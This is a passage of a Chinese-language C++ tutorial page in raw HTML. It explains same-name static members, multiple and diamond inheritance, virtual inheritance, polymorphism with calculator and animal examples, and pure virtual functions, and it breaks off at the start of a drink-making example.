class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">class Base &#123;</span><br><span class="line">public:</span><br><span class="line">static void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base - static void func()&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">static void func(int a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base - static void func(int a)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Base::m_A &#x3D; 100;</span><br><span class="line"></span><br><span class="line">class Son : public Base &#123;</span><br><span class="line">public:</span><br><span class="line">static void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Son - static void func()&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">static int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Son::m_A &#x3D; 200;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;同名成员属性</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;通过对象访问</span><br><span class="line">cout &lt;&lt; &quot;通过对象访问： &quot; &lt;&lt; endl;</span><br><span class="line">Son s;</span><br><span class="line">cout &lt;&lt; &quot;Son  下 m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;Base 下 m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过类名访问</span><br><span class="line">cout &lt;&lt; &quot;通过类名访问： &quot; &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;Son  下 m_A &#x3D; &quot; &lt;&lt; Son::m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;Base 下 m_A &#x3D; &quot; &lt;&lt; Son::Base::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;同名成员函数</span><br><span class="line">void test02()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;通过对象访问</span><br><span class="line">cout &lt;&lt; &quot;通过对象访问： &quot; &lt;&lt; endl;</span><br><span class="line">Son s;</span><br><span class="line">s.func();</span><br><span class="line">s.Base::func();</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;通过类名访问： &quot; &lt;&lt; endl;</span><br><span class="line">Son::func();</span><br><span class="line">Son::Base::func();</span><br><span class="line">&#x2F;&#x2F;出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问</span><br><span class="line">Son::Base::func(100);</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;test01();</span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）</p></blockquote><h3 id="多继承语法"><a href="#多继承语法" class="headerlink" title="多继承语法"></a>多继承语法</h3><p>C++允许<strong>一个类继承多个类</strong></p><p>语法：<code> class 子类 ：继承方式 父类1 ， 继承方式 父类2...</code></p><p>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p><p><strong>C++实际开发中不建议用多继承</strong></p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">class Base1 &#123;</span><br><span class="line">public:</span><br><span class="line">Base1()</span><br><span class="line">&#123;</span><br><span class="line">m_A &#x3D; 100;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Base2 &#123;</span><br><span class="line">public:</span><br><span class="line">Base2()</span><br><span class="line">&#123;</span><br><span class="line">m_A &#x3D; 200;  &#x2F;&#x2F;开始是m_B 不会出问题，但是改为mA就会出现不明确</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;语法：class 子类：继承方式 父类1 ，继承方式 父类2 </span><br><span class="line">class Son : public Base2, public Base1 </span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line">m_C &#x3D; 300;</span><br><span class="line">m_D &#x3D; 400;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_C;</span><br><span class="line">int m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;多继承容易产生成员同名的情况</span><br><span class="line">&#x2F;&#x2F;通过使用类名作用域可以区分调用哪一个基类的成员</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Son s;</span><br><span class="line">cout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(s) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; s.Base1::m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; s.Base2::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h3><p><strong>菱形继承概念：</strong></p><p> 两个派生类继承同一个基类</p><p> 又有某个类同时继承者两个派生类</p><p> 这种继承被称为菱形继承，或者钻石继承</p><p><strong>菱形继承问题案例：</strong></p><p>羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。<br>草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;继承前加virtual关键字后，变为虚继承</span><br><span class="line">&#x2F;&#x2F;此时公共的父类Animal称为虚基类</span><br><span class="line">class Sheep : virtual public Animal &#123;&#125;;</span><br><span class="line">class Tuo   : virtual public Animal &#123;&#125;;</span><br><span class="line">class SheepTuo : public Sheep, public Tuo &#123;&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">SheepTuo st;</span><br><span class="line">st.Sheep::m_Age &#x3D; 100;</span><br><span class="line">st.Tuo::m_Age &#x3D; 200;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;st.Sheep::m_Age &#x3D; &quot; &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;st.Tuo::m_Age &#x3D; &quot; &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;st.m_Age &#x3D; &quot; &lt;&lt; st.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</li><li>利用虚继承可以解决菱形继承问题</li></ul><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h3 id="多态的基本概念"><a href="#多态的基本概念" class="headerlink" title="多态的基本概念"></a>多态的基本概念</h3><p><strong>多态是C++面向对象三大特性之一</strong></p><p>多态分为两类</p><ul><li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li><li>动态多态: 派生类和虚函数实现运行时多态</li></ul><p>静态多态和动态多态区别：</p><ul><li>静态多态的函数地址早绑定 - 编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定 - 运行阶段确定函数地址</li></ul><p>下面通过案例进行讲解多态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">class Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;Speak函数就是虚函数</span><br><span class="line">&#x2F;&#x2F;函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span><br><span class="line">virtual void speak()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;动物在说话&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Cat :public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void speak()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Dog :public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">void speak()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;小狗在说话&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F;我们希望传入什么对象，那么就调用什么对象的函数</span><br><span class="line">&#x2F;&#x2F;如果函数地址在编译阶段就能确定，那么静态联编</span><br><span class="line">&#x2F;&#x2F;如果函数地址在运行阶段才能确定，就是动态联编</span><br><span class="line"></span><br><span class="line">void DoSpeak(Animal &amp; animal)</span><br><span class="line">&#123;</span><br><span class="line">animal.speak();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;多态满足条件： </span><br><span class="line">&#x2F;&#x2F;1、有继承关系</span><br><span class="line">&#x2F;&#x2F;2、子类重写父类中的虚函数</span><br><span class="line">&#x2F;&#x2F;多态使用：</span><br><span class="line">&#x2F;&#x2F;父类指针或引用指向子类对象</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Cat cat;</span><br><span class="line">DoSpeak(cat);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dog dog;</span><br><span class="line">DoSpeak(dog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><p>多态满足条件</p><ul><li>有继承关系</li><li>子类重写父类中的虚函数</li></ul><p>多态使用条件</p><ul><li>父类指针或引用指向子类对象</li></ul><p>重写：函数返回值类型 函数名 参数列表 完全一致称为重写</p><h3 id="多态案例一-计算器类"><a href="#多态案例一-计算器类" class="headerlink" title="多态案例一-计算器类"></a>多态案例一-计算器类</h3><p>案例描述：</p><p>分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类</p><p>多态的优点：</p><ul><li>代码组织结构清晰</li><li>可读性强</li><li>利于前期和后期的扩展以及维护</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;普通实现</span><br><span class="line">class Calculator &#123;</span><br><span class="line">public:</span><br><span class="line">int getResult(string oper)</span><br><span class="line">&#123;</span><br><span class="line">if (oper &#x3D;&#x3D; &quot;+&quot;) &#123;</span><br><span class="line">return m_Num1 + m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">else if (oper &#x3D;&#x3D; &quot;-&quot;) &#123;</span><br><span class="line">return m_Num1 - m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">else if (oper &#x3D;&#x3D; &quot;*&quot;) &#123;</span><br><span class="line">return m_Num1 * m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果要提供新的运算，需要修改源码</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_Num1;</span><br><span class="line">int m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;普通实现测试</span><br><span class="line">Calculator c;</span><br><span class="line">c.m_Num1 &#x3D; 10;</span><br><span class="line">c.m_Num2 &#x3D; 10;</span><br><span class="line">cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;+&quot;) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;-&quot;) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;*&quot;) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;多态实现</span><br><span class="line">&#x2F;&#x2F;抽象计算器类</span><br><span class="line">&#x2F;&#x2F;多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护</span><br><span class="line">class AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public :</span><br><span class="line"></span><br><span class="line">virtual int getResult()</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int m_Num1;</span><br><span class="line">int m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加法计算器</span><br><span class="line">class AddCalculator :public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int getResult()</span><br><span class="line">&#123;</span><br><span class="line">return m_Num1 + m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;减法计算器</span><br><span class="line">class SubCalculator :public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int getResult()</span><br><span class="line">&#123;</span><br><span class="line">return m_Num1 - m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;乘法计算器</span><br><span class="line">class MulCalculator :public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int getResult()</span><br><span class="line">&#123;</span><br><span class="line">return m_Num1 * m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test02()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;创建加法计算器</span><br><span class="line">AbstractCalculator *abc &#x3D; new AddCalculator;</span><br><span class="line">abc-&gt;m_Num1 &#x3D; 10;</span><br><span class="line">abc-&gt;m_Num2 &#x3D; 10;</span><br><span class="line">cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;</span><br><span class="line">delete abc;  &#x2F;&#x2F;用完了记得销毁</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;创建减法计算器</span><br><span class="line">abc &#x3D; new SubCalculator;</span><br><span class="line">abc-&gt;m_Num1 &#x3D; 10;</span><br><span class="line">abc-&gt;m_Num2 &#x3D; 10;</span><br><span class="line">cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;</span><br><span class="line">delete abc;  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;创建乘法计算器</span><br><span class="line">abc &#x3D; new MulCalculator;</span><br><span class="line">abc-&gt;m_Num1 &#x3D; 10;</span><br><span class="line">abc-&gt;m_Num2 &#x3D; 10;</span><br><span class="line">cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;</span><br><span class="line">delete abc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;test01();</span><br><span class="line"></span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：C++开发提倡利用多态设计程序架构，因为多态优点很多</p></blockquote><h3 id="纯虚函数和抽象类"><a href="#纯虚函数和抽象类" class="headerlink" title="纯虚函数和抽象类"></a>纯虚函数和抽象类</h3><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p><p>因此可以将虚函数改为<strong>纯虚函数</strong></p><p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p><p>当类中有了纯虚函数，这个类也称为==抽象类==</p><p><strong>抽象类特点</strong>：</p><ul><li>无法实例化对象</li><li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">class Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;纯虚函数</span><br><span class="line">&#x2F;&#x2F;类中只要有一个纯虚函数就称为抽象类</span><br><span class="line">&#x2F;&#x2F;抽象类无法实例化对象</span><br><span class="line">&#x2F;&#x2F;子类必须重写父类中的纯虚函数，否则也属于抽象类</span><br><span class="line">virtual void func() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Son :public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual void func() </span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Base * base &#x3D; NULL;</span><br><span class="line">&#x2F;&#x2F;base &#x3D; new Base; &#x2F;&#x2F; 错误，抽象类无法实例化对象</span><br><span class="line">base &#x3D; new Son;</span><br><span class="line">base-&gt;func();</span><br><span class="line">delete base;&#x2F;&#x2F;记得销毁</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态案例二-制作饮品"><a href="#多态案例二-制作饮品" class="headerlink" title="多态案例二-制作饮品"></a>多态案例二-制作饮品</h3><p><strong>案例描述：</strong></p><p>制作饮品的大致流程为：煮水 - 冲泡 - 倒入杯中 - 加入辅料</p><p>利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 